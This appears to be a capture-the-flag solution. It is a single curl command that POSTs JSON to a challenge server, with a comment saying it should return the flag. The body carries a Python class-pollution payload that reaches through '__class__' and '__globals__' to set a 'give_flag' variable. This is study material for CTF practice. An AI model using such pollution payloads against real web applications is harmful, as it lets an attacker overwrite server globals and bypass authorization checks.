curl -X POST https://cats.chals.cyberjousting.com/cat \
     -H "Content-Type: application/json" \
     -d '{ "name": "Chunky Grumps", "age": 3, "color": "tabby", "is_happy": true, "__class__": { "to_dict": { "__globals__": { "give_flag": true } } } }' 

# should return the flag
